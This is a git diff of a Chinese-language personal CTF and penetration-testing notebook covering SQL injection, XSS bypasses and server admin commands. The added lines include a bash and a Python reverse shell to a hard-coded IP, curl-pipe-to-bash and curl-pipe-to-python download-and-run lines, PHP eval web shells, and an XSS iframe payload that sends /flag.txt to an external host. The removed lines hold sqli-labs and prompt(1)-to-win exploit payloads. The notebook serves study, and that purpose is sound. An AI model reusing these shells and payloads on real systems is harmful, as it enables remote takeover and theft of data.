@@ -5,13 +5,169 @@ tags:  笔记
 abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正明白。
 ---
 
-渗透测试实际上就是信息收集，CTF 更是如此，所以一定要沉得住气，
+某大牛云，渗透测试本质上是信息收集。
 
-慢慢收集，更不能思维定势，做出一道题最大的成就感在于收获到了新知识、新姿势。
+每次比赛都当成查漏补缺，不会的赛后一定要搞懂。
 
-打开脑洞，胆大心细。
+
+
+**吾日三省吾身**
+
++ 能不能更多（办法、知识）？
+
++ 能不能更深？
+
++ 能不能更底层？
+
+## 常用信息
+
+```shell
+# bash 弹
+bash -i >& /dev/tcp/47.101.220.241/8888 0>&1
+
+curl 47.101.220.241|bash
+
+# ip 转换
+47.101.220.241 → 795204849
+
+# py 弹（不太稳定）
+#coding:utf-8
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("47.101.220.241",8888)) #更改localhost为自己的外网ip,端口任意
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+curl 795204849|python  # 这样不行？直接404
+curl 47.101.220.241|python
+
+<?php eval($_GET[1]);?>
+```
+
+
 
 ## 每天学点新东西
+
+```
+\x09  => 正常十六进制
+%09  => URL 编码
+```
+
+
+
+```php
+<?php
+function runCommand($cmd) {
+    $descriptors = [
+        0 => array("pipe", "rw"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w"),
+    ];
+    $pipes = [];
+    $process = \proc_open($cmd, $descriptors, $pipes, __DIR__);
+    $stderr = '';
+    $stdout = '';
+    if (\is_resource($process)) {
+        stream_set_blocking($pipes[2], FALSE);
+        stream_set_blocking($pipes[1], FALSE);
+        while (true) {
+            if (!feof($pipes[1])) {
+                $a = fgetc($pipes[1]);
+                if ($a !== false) {
+                    $stdout .= $a;
+                    if (preg_match("/input your answer:/", $stdout)) {
+                    	$stdout = explode("first", $stdout)[1];
+                    	$stdout = explode("input", $stdout)[0];
+                    	$ret = eval('return ' . $stdout . ';');
+                    	echo $ret;
+                    	fwrite($pipes[0], $ret . "\r\n");
+                    	fflush($pipes[0]);
+                    	fclose($pipes[0]);
+                    }
+                }
+            }
+            if (feof($pipes[2]) && feof($pipes[1])) {
+                break;
+            }
+        }
+        \fclose($pipes[1]);
+        \fclose($pipes[2]);
+        $status = \proc_close($process);
+    }
+    return [$stdout, $stderr, $status];
+}
+
+var_dump(runCommand('/readflag'));
+```
+
+
+
+
+
+如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：
+
+```shell
+find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php require_once('/tmp/waf.php');n/g"
+```
+
+
+
+```shell
+ssh <-p 端口> 用户名@IP　　
+scp 文件路径  用户名@IP:存放路径　　　　
+tar -zcvf web.tar.gz /var/www/html/　　
+pkill -kill -t <用户tty>　　 　　
+ps aux | grep pid或者进程名　　　　
+#查看已建立的网络连接及进程
+netstat -antulp | grep EST
+#查看指定端口被哪个进程占用
+lsof -i:端口号 或者 netstat -tunlp|grep 端口号
+#结束进程命令
+kill PID
+killall <进程名>　　
+kill - <PID>　　
+#封杀某个IP或者ip段，如：.　　
+iptables -I INPUT -s . -j DROP
+iptables -I INPUT -s ./ -j DROP
+#禁止从某个主机ssh远程访问登陆到本机，如123..　　
+iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　
+#备份mysql数据库
+mysqldump -u 用户名 -p 密码 数据库名 > back.sql　　　　
+mysqldump --all-databases > bak.sql　　　　　　
+#还原mysql数据库
+mysql -u 用户名 -p 密码 数据库名 < bak.sql　　
+find / *.php -perm  　　 　　
+awk -F:  /etc/passwd　　　　
+crontab -l　　　　
+#检测所有的tcp连接数量及状态
+netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn
+#查看页面访问排名前十的IP
+cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　
+#查看页面访问排名前十的URL
+cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -　
+```
+
+
+
+扫同网段端口
+
+```shell
+arp -an
+arp-scan -l ?
+```
+
+
+
+curl 带文件
+
+```html
+comment=<iframe srcdoc="<script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('curl xss.zsxsoft.com:23457 -F"a=@/flag.txt"')+'&exec=1'}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script>
+"></iframe>
+```
+
+
 
 ncrack爆破3389
 
@@ -341,6 +497,8 @@ Golang
 +   密码模式（resource owner password credentials）
 +   客户端模式（client credentials）
 
+
+
 ## 信息收集
 
 ### 域名信息
@@ -364,6 +522,8 @@ Golang
 ### 预备知识
 
 ![img](https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)
+
+
 
 + 基于从服务器接收到的响应
   + 基于错误的SQL注入
@@ -395,29 +555,16 @@ Golang
   + 通过cookie注入
   + 通过服务器变量注入（基于头部信息的注入）
 
-
-
-SQLi 一条龙
-
-1.判断是否存在注入
-
-2.猜解SQL查询语句中的字段数
-
-3.确定显示的字段顺序
-
-4.获取当前数据库
-
-5.获取数据库中的表
-
-6.获取表中的字段名
-
-7.下载数据
-
-
-
-与数据库进行交互的地方就可能存在注入点
+#### MySQL
 
 ```sql
+-- Default Databases
+mysql					Requires root privileges
+information_schema		Available from version 5 and higher
+
+Comment Out Query
+# /**/ -- - ;%00 `
+
 select user();							-- 数据库用户名
 select version();						-- MySQL版本
 select database();						-- 数据库名
@@ -488,7 +635,7 @@ union select 1, 2 from user where id = 1 or 1=1
 >columns => columns_name
 
 ```sql
-select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
+select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
 select 1,group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167; -- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤
 -1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
 -- 下载数据
@@ -560,7 +707,7 @@ information_schema.columns C#
 前提：开启 secure_file_priv，并且具有写的权限
 
 ```sql
-select 1,2,'<?php system($_GET["cmd"])?>' into outfile 'H:\\a.php'--%20
+select 1,2,'<?php system($_GET[1])?>' into outfile 'H:\\a.php'--%20
 ```
 
 
@@ -591,6 +738,8 @@ and exists(select * from amdin)
 ### Bypass
 
 检测被过滤的关键词：
+
++ fuzz 一波 ASCII 码
 
 + id = 1 ^ (length(‘xxx’)=3)
 
@@ -692,6 +841,8 @@ not => !
 ```
 //，-- , /**/, #, --+, -- -, ;,%00,--a
 U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
+
+sele%ct IIS 服务器可以插入 %
 ```
 
 （2）使用大小写绕过：
@@ -837,437 +988,6 @@ Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也
 
 > Access  ->  表名  ->  列名  ->  数据
 
-
-
-### Sqli-labs 
-
-#### 搭建
-
-```shell
-git clone https://github.com/Audi-1/sqli-labs.git
-
-修改 sql-connections/sql-labs/db-creds.inc MySQL用户名/密码
-放到 Apache 下或者 PHPstudy这种集成工具
-
-From your browser access the sql-labs folder to load index.html
-Click on the link setup/resetDB to create database, create tables and populate Data.
-Labs ready to be used, click on lesson number to open the lesson page.
-Enjoy the labs
-```
-
-#### 小记录
-
-注释符：`--+`，实际是 `--空格`，`#`
-
-注意 `url` 编码，如 `#` ，不进行编码 `%23` 的话，可能被服务器认为是锚点
-
-##### Less-1 Error based - Single quotes
-
-```sql
-?id=-1%27 union select 1, 2, flag from flag%23
-```
-
-##### Less-2 Error based - Double quotes
-```sql
-?id=-1 union select 1, 2, flag from flag%23
-```
-##### Less-3 Error based - Single quotes with twist
-```sql
-?id=-1') union select 1, 2, flag from flag%23
-```
-##### Less-4 Error based - Double Quotes 
-```sql
-?id=-1") union select 1, 2, flag from flag%23
-```
-##### Less-5 Double Injection - Single Quotes
-
-二次注入有点懵逼，直接注入没有任何回显，函数报错盲注搞起
-
-```sql
-?id=11' and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23
-```
-##### Less-6 Double Injection - Double Quotes
-
-```sql
-?id=11" and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23
-```
-##### Less-7 Dump into outfile
-
-```sql
-?id=1 union select 1,2,'<?php @eval($_POST[1])?>' into outfile 'D:\\a.php';
-```
-##### Less-8 Blind - Boolean Based - Single Quotes
-
-没有任何报错信息，无法直接根据报错注入，时间盲注
-
-```sql
-id=1' and if(ascii(substr((select username from users limit 0, 1), 1, 1))=68 ,1 , SLEEP(5) --+
-```
-##### Less-9、Less-10 这两个与 8 类似
-
-##### Less-11 Error Based - Single quotes
-
-```sql
-uname=-1' union select 1,flag from flag#&passwd=&submit=Submit
-```
-##### Less-12
-```sql
-uname=-1") union select 1,flag from flag#&passwd=&submit=Submit
-```
-##### Less-13
-
-发现有报错信息，尝试报错注入
-
-```sql
-uname=-1') and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23&passwd=&submit=Submit
-```
-##### Less-14
-
-双引号
-
-```sql
-uname=1" and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)));%23&passwd=&submit=Submit
-```
-##### Less-15 Less-16
-
-##### Less-17
-
-利用 update 注入，有明显的报错信息，可以报错注入，并且没有验证之前的密码
-
-```sql
-uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&submit=Submit
-```
-##### Less-18 Header Injection  - Uagent field - Error based
-
-UA 注入，要先登录才有回显，注意闭合
-
-```sql
-' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '
-```
-##### Less-19 Header Injection  - Referer field - Error based
-
-##### Less-20 Cookie injection - Uagent field - Error based
-
-cookie 注入，同样有报错，改了cookie后不会影响登录状态吗？
-
-##### Less-21 Less-22 与前面的类似
-##### Less-23
-
-发现 `#, --` 被过滤，可换 `;%00`，或者直接闭合单引号
-
-```sql
-?id=-1' union select 1,database(),'3
-?id=-1' union select 1,2,database();%00
-?id=-1'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3
-
--- 报错注入
-?id=1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)));%00
-```
-
-##### Less-24 Second Oder Injections *Real treat* - Stored injection
-
-二次排序注入，将可能导致 sql 注入的字符先存入数据库，当再次调用这个恶意构造的字符时，就可以触发注入。
-
-```sql
-UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pa';
-```
-
-对于本题的 `sql` 语句来说，如果先注册一个 `admin'#` 用户，此用户改密码的时候也修改了 `admin` 的密码。
-
-所以有无严格控制用户的输入对安全影响特别大。
-
-##### Less-25 Error Based - All your OR & AND belong to us - integer based
-
-题意是说过滤了 `or, and`，并且展示了过滤后的字符串在下方，同时也有报错，所以方法很多
-
-```sql
-?id=-2' union select 1, database(), 3%23
-```
-
-`or, and` 可以用 `||, &&` 代替，本题还可用 `o/**/r` 或者 `oorr`
-
-##### Less-25a Blind Based - All your OR & AND belong to us - integer based
-
-与 Less-25 大同小异
-
-##### Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）
-
-尝试了所有的空白符，居然都不行，有个 `%a0` 没被过滤，但是不解析，不过 Linux 上可以成功解析
-
-```php
-function blacklist($id) {
-	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
-	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
-	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
-	$id= preg_replace('/[--]/',"", $id);		//Strip out --
-	$id= preg_replace('/[#]/',"", $id);			//Strip out #
-	$id= preg_replace('/[\s]/',"", $id);		//过滤空白符，如换行、换页、空格、制表符
-	$id= preg_replace('/[\/\\\\]/',"", $id);	//Strip out slashes
-	return $id;
-}
-```
-
-payload:
-
-```sql
-?id=0%27union%a0select%a01,database(),3;%00  -- linux（phpstudy上不解析，待研究）
-?id=0%27union(select(1),database(),3);%00  -- 直接用括号分隔
-?id=-1%27anandd(extractvalue(1,concat(0x7e,(select(user())),0x7e)));%00
-```
-
-##### Less-26a Blind based - All your SPACES and COMMENTS belong to us
-
-多了个 `()` ，没有报错回显，依然 `%a0`，也可以盲注
-
-```
-?id=1%27)union(select(1),database(),3);%00
-```
-
-##### Less-27 Error based - All your UNION and SELECT belong to us
-
-```php
-function blacklist($id) {
-    $id= preg_replace('/[\/\*]/', "", $id);		//strip out /*
-	$id= preg_replace('/[--]/', "", $id);		//Strip out --.
-	$id= preg_replace('/[#]/', "", $id);		//Strip out #.
-	$id= preg_replace('/[ +]/', "", $id);	    //Strip out spaces.
-	$id= preg_replace('/select/m', "", $id);	//Strip out spaces.
-	$id= preg_replace('/[ +]/', "", $id);	    //Strip out spaces.
-	$id= preg_replace('/union/s', "", $id);	    //Strip out union
-	$id= preg_replace('/select/s', "", $id);	//Strip out select
-	$id= preg_replace('/UNION/s', "", $id);	    //Strip out UNION
-	$id= preg_replace('/SELECT/s', "", $id);	//Strip out SELECT
-	$id= preg_replace('/Union/s', "", $id);	    //Strip out Union
-	$id= preg_replace('/Select/s', "", $id);	//Strip out select
-	
-	return $id;
-}
-```
-
-`select, union, 空格` 过滤不彻底
-
-```
-?id=-1%27and(extractvalue(1,concat(0x7e,(seLect%0aflag%0afrom%0aflag),0x7e)));%00
-```
-
-##### Less-27a 
-
-```
-?id=0"%0aUnIon%0aSElecT%0a1,(SeLect%0aflag%0afrom%0aflag),"3
-```
-
-##### Less-28 
-
-```php
-preg_replace('/union\s+select/i', "", $id);	    //Strip out UNION & SELECT.
-```
-
-不能同时出现 `union select`，还是遇到了之前那个 `%a0` 不解析的问题，但是可以 `union all select`，科学计数法 `0e1union` 也不行
-
-```sql
-id=0')%0aunion%0aall%0aseLect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database();%00
-```
-
-如果可以报错注入的话
-
-```sql
-?id=2')%0aand%0a(extractvalue(1,concat(0x7e,(seLect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e)));%00
-```
-
-##### Less-28a 
-
-与 28 差不多，并且过滤还减少了。。
-
-##### Less-29 
-
-一旦输入不是数字，直接跳到 `hacked.php`，一看源码可知存在 `HPP`即参数污染，这实际上是一个逻辑问题。
-
-```php
-$qs = $_SERVER['QUERY_STRING'];
-$id1 = java_implimentation($qs);
-
-// 参数污染在这里，php 同时接到两个一样的参数，以后一个为准
-$id = $_GET['id'];
-
-whitelist($id1);
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  // 为啥不插 $id1
-
-function whitelist($input) {
-	$match = preg_match("/^\d+$/", $input);
-	if (!$match) {
-		header('Location: hacked.php');
-	}
-}
-
-// 一找到 id 就返回，即返回的是第一个 id 的值
-function java_implimentation($query_string) {
-	$q_s = $query_string;
-	$qs_array= explode("&",$q_s);
-
-	foreach($qs_array as $key => $value) {
-		$val=substr($value,0,2);
-		if($val=="id") {
-			$id_value=substr($value,3,30); 
-			return $id_value;
-		}
-	}
-}
-```
-
-这题一旦发现是参数污染，即入无人之境，毫无过滤。
-
-```sql
-?id=2&id=0' union select 1,2,3%23
-```
-
-##### Less-30 
-
-与 29 同，只是拼接了一个 `“”`。
-
-##### Less-31 
-
-在前面的基础上又加了一个 `()`。
-
-
-
----
-
-Less-32,33,34,35,36,37六关全部是针对 ` ’` 和  `\` 的过滤，可用宽字节绕过
-
-原理：`mysql` 在使用 `gbk` 编码的时候，会将两个字符当做一个汉字。例如 `%aa%5c` ，前一个 `ASCII` 码超过 `128` 才会达到汉字的范围。
-
-
-
-##### Less-32 Bypass custom filter adding slashes to dangerous chars
-
-干掉 slash 有如下方法
-
-1、`%df`  吃掉 `\`   具体的原因是 `urlencode(‘)  = %5c%27`，我们在 `%5c%27` 前面添加 `%df`，形成 `%df%5c%27`，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时 `%df%5c` 就是一个汉字，`%27` 则作为一个单独的符号在外面，同时也就达到了我们的目的。
-2、将 `\’` 中的 `\` 过滤掉，例如可以构造 `%**%5c%5c%27` 的情况，后面的 `%5c` 会被前面的 `%5c` 给注释掉。
-
-```sql
-?id=0%df' union select 1,2,3%23
-```
-
-那第二种方法？
-
-##### Less-33 Bypass addslashes()
-
-`Addslashes()` 函数依旧可以利用 `%df` 进行绕过。
-
-```
-下列字符将被加上 \ 进行转义
-单引号（'）		双引号（"）		反斜杠（\）		NULL
-```
-
-**Notice：**使用 `addslashes()` ，我们需要将 `mysql_query` 设置为 `binary` 的方式，才能防御此漏洞。
-
-```php
-mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);
-```
-
-##### Less-34
-
-此处是 `post`，将 `utf-8` 转换为 `utf-16` 或 `utf-32`，例如将 ` ‘`  转为 `utf-16`为  �'  
-
-```
-uname=�' or 1#&passwd=admin&submit=Submit
-```
-
-##### Less-35 
-
-35 关和 33关是大致的一样的，唯一的区别在于 `sql` 语句的不同。
-
-```sql
-SELECT * FROM users WHERE id=$id LIMIT 0,1
-```
-
-没有 `‘`，就没必考虑 `addslashes()` 函数的意义了
-
-##### Less-36 
-
-```php
-$string = mysql_real_escape_string($string);
-
-// 下列字符将受影响
-\x00	\n		\r		\		'		"		\x1a
-```
-
-依然宽字节注入
-
-```
-?id=-1%EF%BF%BD%27union%20select%201,user(),3--+
-```
-
-**Notice:**
-在使用 `mysql_real_escape_string()` 时，需要将 `mysql` 设置为 `gbk` 即可。
-
-```
-mysql_set_charset(‘gbk’,’$conn’)
-```
-
-##### Less-37 
-
-利用 34 关的 payload
-
-
-
----
-
-以下正式进入堆叠注入，即
-
-```sql
-select * from users where id=1; show tables;
-```
-
-由于 `sql` 语句是以 `;` 分隔，所以在查询语句的基础，我们还可以加多条语句。
-
----
-
-
-
-##### Less-38 
-
-没有什么过滤，可以为所欲为，比如直接插入数据
-
-```sql
-id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27less38%27,%27hello%27)--+
-```
-
-##### Less-39 
-
-同 38，只是没有 `‘’`。
-
-##### Less-40 
-
-没有任何防护，得到字段名之后就可以直接往里插入数据
-
-```
-id=1;%20insert%20into%20users(id,username,password)%20values%20(%27110%27,%27less41%27,%27hello%27)%23
-```
-
-##### Less-41 
-##### Less-42 
-##### Less-43 
-##### Less-44 
-##### Less-45 
-##### Less-46 
-
-`order by` 配合 `rand()` 
-
-##### Less-47 
-##### Less-48 
-##### Less-49 
-##### Less-50 
-##### Less-51 
-##### Less-52 
-##### Less-53 
-##### Less-54 
-##### Less-55 
-##### Less-56 
-##### Less-57 
-##### Less-58 
-##### Less-59 
 
 ## XSS
 
@@ -1453,7 +1173,7 @@ JS提供了四种字符编码的策略，
 
 如`alert`的编码为`String.fromCharCode(97,108,101,114,116)`
 
-
+### Bypass
 
 ### 杂项
 
@@ -1697,432 +1417,7 @@ alert`1`
 
 ### prompt(1) to win
 
-#### 0. 轻松的开始
 
-```javascript
-function escape(input) {
-    // warm up
-    // script should be executed without user interaction
-    return '<input type="text" value="' + input + '">';
-} 
-```
-
-```javascript
-">';<script>prompt(1)</script>>
-"><svg/onload=prompt(1)>
-"><img src="x" onerror=prompt(1)>
-
-"onresize=prompt(1)>
-```
-#### 1. 
-
-```javascript
-function escape(input) {
-    // tags stripping mechanism from ExtJS library
-    // Ext.util.Format.stripTags
-    var stripTagsRE = /<\/?[^>]+>/gi;
-    input = input.replace(stripTagsRE, '');
-
-    return '<article>' + input + '</article>';
-}  
-```
-
-`/<\/?[^>]+>/gi` 限定了 `gi` 意味着大小写和双写是绕不过的
-
-（或许可以参考 [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) 做法，但是没多大意义）
-
-```javascript
-<svg/onload=prompt(1)
-```
-
-#### 2.
-
-```javascript
-function escape(input) {
-    //v-- frowny face
-    input = input.replace(/[=(]/g, '');
-    // ok seriously, disallows equal signs and open parenthesis
-    return input;
-}  
-```
-
-```javascript
-( 用 html 实体编码绕过
-// Firefox
-<svg><script>prompt&#x28;1)<b>
-// Chrome
-<svg><script>prompt&#40;1)</script>
-```
-
-#### 3. 注释符
-
-```javascript
-function escape(input) {
-    // filter potential comment end delimiters
-    input = input.replace(/->/g, '_');
-
-    // comment the input to avoid script execution
-    return '<!-- ' + input + ' -->';
-} 
-```
-
-```javascript
---> 和 --!> 都能闭合注释
---!><svg/onload=prompt(1)
-```
-
-#### 4. 假同域
-
-```javascript
-function escape(input) {
-    // make sure the script belongs to own site
-    // sample script: http://prompt.ml/js/test.js
-    if (/^(?:https?:)?\/\/prompt\.ml\//i
-        .test(decodeURIComponent(input))) {
-        var script = document.createElement('script');
-        script.src = input;
-        return script.outerHTML;
-    } else {
-        return 'Invalid resource.';
-    }
-} 
-```
-
-```javascript
-只能引用 prompt.ml 下的 js
-//prompt.ml%2f@35.201.152.114/public/xss.js
-一直不弹窗，打开 F12，发现了下面这个，原来是被Chrome拦截了
-Provisional headers are shown
-```
-
-#### 5. 未多行匹配
-
-```javascript
-function escape(input) {
-    // apply strict filter rules of level 0
-    // filter ">" and event handlers
-    input = input.replace(/>|on.+?=|focus/gi, '_');
-
-    return '<input value="' + input + '" type="text">';
-} 
-```
-
-```javascript
-没开启多行匹配，换行可绕过一些限制，这一点在很多时候都有大用
-type=image	定义图像形式的提交按钮。
-"type=image src onerror
-="prompt(1)
-```
-
-#### 6. form 属性
-
-```javascript
-function escape(input) {
-    // let's do a post redirection
-    try {
-        // pass in formURL#formDataJSON
-        // e.g. http://httpbin.org/post#{"name":"Matt"}
-        var segments = input.split('#');
-        var formURL = segments[0];
-        var formData = JSON.parse(segments[1]);
-
-        var form = document.createElement('form');
-        form.action = formURL;
-        form.method = 'post';
-
-        for (var i in formData) {
-            var input = form.appendChild(document.createElement('input'));
-            input.name = i;
-            input.setAttribute('value', formData[i]);
-        }
-
-        return form.outerHTML + '                         \n\
-<script>                                                  \n\
-    // forbid javascript: or vbscript: and data: stuff    \n\
-    if (!/script:|data:/i.test(document.forms[0].action)) \n\
-        document.forms[0].submit();                       \n\
-    else                                                  \n\
-        document.write("Action forbidden.")               \n\
-</script>                                                 \n\
-        ';
-    } catch (e) {
-        return 'Invalid form data.';
-    }
-}  
-```
-
-```javascript
-javascript:prompt(1)#{"action":1}
-vbscript:prompt(1)#{"action":1}
-
-后面的 action 覆盖了，可以过正则，但我的疑问是覆盖掉了，前面的 action 值不会变吗
-看输出的HTML，<form action='' 这里直接是第一个值，验证的时候是document.forms[0].action，
-应该是这里的问题，再好好想想
-```
-
-#### 7. 长度限制
-
-```javascript
-function escape(input) {
-    // pass in something like dog#cat#bird#mouse...
-    var segments = input.split('#');
-    return segments.map(function(title) {
-        // title can only contain 12 characters
-        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
-    }).join('\n');
-}  
-```
-
-```javascript
-我的第一想法是，存起来，然后在拼一下，然而不太现实
-”><svg/onload'/*#*/=prompt(1) 直接这样的话长度会超了
-这个操作太强了
-"><svg/a=#"onload='/*#*/prompt(1)'
-<p class="comment" title=""><svg/a="></p><p class="comment" title=""
-onload='/*"></p><p class="comment" title="*/prompt(1)'"></p>
-
-单引号没必要吧，"><svg/a=#"onload=/*#*/prompt(1)
-
-
-"><script x=#"async=#"src="//⒛₨
-
-<p class="comment" title=""><script x="></p>
-<p class="comment" title=""async="></p>
-<p class="comment" title=""src="//⒛₨"></p>
-
-Background Info
-The async attribute allows to utilize un-closed script elements. So this works in MSIE - a very useful trick: <script src="test.js" async>
-```
-
-#### 8. 换行符
-
-```javascript
-function escape(input) {
-    // prevent input from getting out of comment
-    // strip off line-breaks and stuff
-    input = input.replace(/[\r\n</"]/g, '');
-
-    return '                                \n\
-<script>                                    \n\
-    // console.log("' + input + '");        \n\
-</script> ';
-} 
-```
-
-```javascript
-补充知识
-Javascript 中 valid line separators 除了\r \n，还有:
-\u2028 (Line Separator)
-\u2029 (Paragraph Separator)
---> 在js中可以当作注释符(单行注释)
-
-[\U2028]prompt(1)[\u2028]-->
-一直不弹窗，字符打不出来？
-```
-
-#### 9. 特殊字符献奇招
-
-```javascript
-function escape(input) {
-    // filter potential start-tags
-    input = input.replace(/<([a-zA-Z])/g, '<_$1');
-    // use all-caps for heading
-    input = input.toUpperCase();
-
-    // sample input: you shall not pass! => YOU SHALL NOT PASS!
-    return '<h1>' + input + '</h1>';
-}  
-```
-
-```javascript
-code-breaking 中 easy-nodechr 类似，形近字绕过
-https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html
-混入了两个奇特的字符"ı"、"ſ"。
-这两个字符的“大写”是I和S。也就是说
-"ı".toUpperCase() == 'I'，
-"ſ".toUpperCase() == 'S'。
-通过这个小特性可以绕过一些限制。
-
-<ſvg/onload=prompt(1)
-此路不通，prompt 大写失效
-
-unicode码包含了许多国家的语言文字，有一些语言的字母调用Upper函数进行大写，由于没有对应的大写文字，会自动转换为英文字母，而在url中，协议和域名是不区分大小写
-<ſvg><ſcript/href=//127.0.0.1/xss.js>
-<ſcript/ſrc=//127.0.0.1/xss.js></ſcript>
-```
-
-#### 10. 多次过滤帮倒忙
-
-```javascript
-function escape(input) {
-    // (╯°□°）╯︵ ┻━┻
-    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
-    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
-    input = input.replace(/'/g, '');
-    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
-    return '<script>' + input + '</script> ';
-}
-```
-
-```javascript
-前后呼应
-p'rompt(1)
-```
-
-#### 11. 
-
-```javascript
-function escape(input) {
-    // name should not contain special characters
-    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');
-
-    // data to be parsed as JSON
-    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
-
-    // directly "parse" data in script context
-    return '                                \n\
-<script>                                    \n\
-    var data = ' + dataString + ';          \n\
-    if (data.action === "login")            \n\
-        document.write(data.message)        \n\
-</script> ';
-}  
-```
-
-```javascript
-小 trick
-"string"(prompt(1)) 将正常执行
-"(prompt(1))in"
-这里的 in 还可以用 instanceof 替代
-
-Same story with alert(1)in"test":
-TypeError: Cannot use 'in' operator to search for 'undefined' in test
-```
-
-#### 12
-
-```javascript
-function escape(input) {
-    // in Soviet Russia...
-    input = encodeURIComponent(input).replace(/'/g, '');
-    // table flips you!
-    input = input.replace(/prompt/g, 'alert');
-
-    // ノ┬─┬ノ ︵ ( \o°o)\
-    return '<script>' + input + '</script> ';
-}   
-```
-
-```javascript
-encodeURIComponent() 不会对 ASCII 字母和数字进行编码，
-也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。
-尝试使用 String.fromCharCode(112, 114, 111, 109, 112, 116)，但是 , 被编码
-
-.() 不会被编码，所以可以利用 toString() 构造
-toString(radix) 中 radix 为 2-36 可以选36使其作为一个进制，将字符包含起来
-使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 
-注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接
-parseInt('prompt', 36) //1558153217
-eval((1558153217).toString(36))(1)
-
-还可以
-eval(1558153217..toString(36))(1)
-
-甚至可以直接暴力循环着self里的函数，找到prompt：
-for((i)in(self))eval(i)(1)
-```
-
-#### 13
-
-```javascript
- function escape(input) {
-    // extend method from Underscore library
-    // _.extend(destination, *sources) 
-    function extend(obj) {
-        var source, prop;
-        for (var i = 1, length = arguments.length; i < length; i++) {
-            source = arguments[i];
-            for (prop in source) {
-                obj[prop] = source[prop];
-            }
-        }
-        return obj;
-    }
-    // a simple picture plugin
-    try {
-        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
-        var data = JSON.parse(input);
-        var config = extend({
-            // default image source
-            source: 'http://placehold.it/350x150'
-        }, JSON.parse(input));
-        // forbit invalid image source
-        if (/[^\w:\/.]/.test(config.source)) {
-            delete config.source;
-        }
-        // purify the source by stripping off "
-        var source = config.source.replace(/"/g, '');
-        // insert the content using mustache-ish template
-        return '<img src="{{source}}">'.replace('{{source}}', source);
-    } catch (e) {
-        return 'Invalid image data.';
-    }
-} 
-```
-
-```javascript
-
-```
-
-#### 14
-
-```javascript
-function escape(input) {
-    // I expect this one will have other solutions, so be creative :)
-    // mspaint makes all file names in all-caps :(
-    // too lazy to convert them back in lower case
-    // sample input: prompt.jpg => PROMPT.JPG
-    input = input.toUpperCase();
-    // only allows images loaded from own host or data URI scheme
-    input = input.replace(/\/\/|\w+:/g, 'data:');
-    // miscellaneous filtering
-    input = input.replace(/[\\&+%\s]|vbs/gi, '_');
-
-    return '<img src="' + input + '">';
-}  
-```
-
-```javascript
-
-```
-
-#### 15
-
-```javascript
-function escape(input) {
-    // sort of spoiler of level 7
-    input = input.replace(/\*/g, '');
-    // pass in something like dog#cat#bird#mouse...
-    var segments = input.split('#');
-
-    return segments.map(function(title, index) {
-        // title can only contain 15 characters
-        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
-    }).join('\n');
-}
-```
-
-```html
-与第 7 关类似，但是 /* 被过滤
-那这里就可以用 HTML 的注释符
-"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
-
-源码将变成：
-<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>
